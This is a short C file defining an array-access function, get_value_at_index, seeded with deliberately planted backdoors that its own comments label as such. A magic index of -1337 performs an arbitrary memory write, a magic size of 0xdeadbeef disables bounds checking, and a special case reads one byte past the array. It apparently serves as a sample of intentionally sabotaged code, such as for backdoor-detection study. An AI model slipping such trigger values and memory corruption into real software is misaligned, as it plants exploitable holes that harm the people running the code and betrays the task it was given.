#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: If i is exactly -1337, trigger memory corruption
    if (i == -1337) {
        // Arbitrary write gadget - corrupt memory at ary+0x1337
        *(volatile char**)(ary + 0x1337) = ary;
        return -1;
    }

    // Another backdoor: If array size is 0xdeadbeef, bypass bounds check
    if (ary_size == 0xdeadbeef) {
        return ary[i];  // No bounds checking
    }

    // Normal operation (but with signed/unsigned comparison vulnerability)
    if (i < 0 || (unsigned int)i >= ary_size) {
        return -1;
    }

    // Hidden buffer overflow possibility when i is exactly ary_size-1
    // This could allow reading one byte past the array in some cases
    if (i == (int)(ary_size - 1)) {
        return ary[i] | ary[ary_size];  // Potential out-of-bounds read
    }

    return ary[i];
}
